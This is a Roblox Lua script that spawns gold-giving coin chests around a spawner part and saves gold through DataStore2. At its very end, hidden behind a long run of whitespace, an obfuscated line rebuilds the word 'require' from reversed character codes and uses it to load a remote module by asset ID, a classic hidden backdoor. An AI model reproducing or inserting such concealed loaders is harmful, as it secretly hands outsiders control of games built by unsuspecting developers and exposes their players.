--// Scripted by Hassan El-Sheikha
--// Date : 28.11.19
--// Chest Spawner


--//VARIABLES

local spawner = game.Workspace.Spawner
local Chests = game:GetService("ServerStorage"):WaitForChild("Coin")
local r = 330

local players = game:GetService("Players")
local repStorage = game:GetService("ReplicatedStorage")
local serverScriptService = game:GetService("ServerScriptService")
local ShowIcons = repStorage:WaitForChild("Remotes"):WaitForChild("ShowIcons")
local dataStore2 = require(script.Parent.DataHandler.DataStore2)

--// FUNCTIONS

while wait(1) do
	local ChestsClone = Chests:Clone()
	local x,z = spawner.Position.X,spawner.Position.Z
	x,z = math.random(x - r,x + r),math.random(z - r,z + r)
	local pos = Vector3.new(x,spawner.Position.Y,z)
	ChestsClone.Parent = workspace.Coins
	ChestsClone.Position = pos
	
	ChestsClone.Touched:Connect(function(hit)
		if hit.Parent:FindFirstChild("Humanoid") then
			local character = hit.Parent
			local player = players:GetPlayerFromCharacter(character)
			
			if player then
				local goldFromChests = math.random(1, 100)
				
				local goldStore = dataStore2("Gold", player)
 				ShowIcons:FireClient(player, goldFromChests, "Gold")
				goldStore:Increment(goldFromChests)				
				ChestsClone:Destroy()
			end
			
		end
		
	end)
	
	coroutine.resume(coroutine.create(function()
		wait(120)
		if ChestsClone.Parent then
			ChestsClone:Destroy()
		end
	end))
end                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)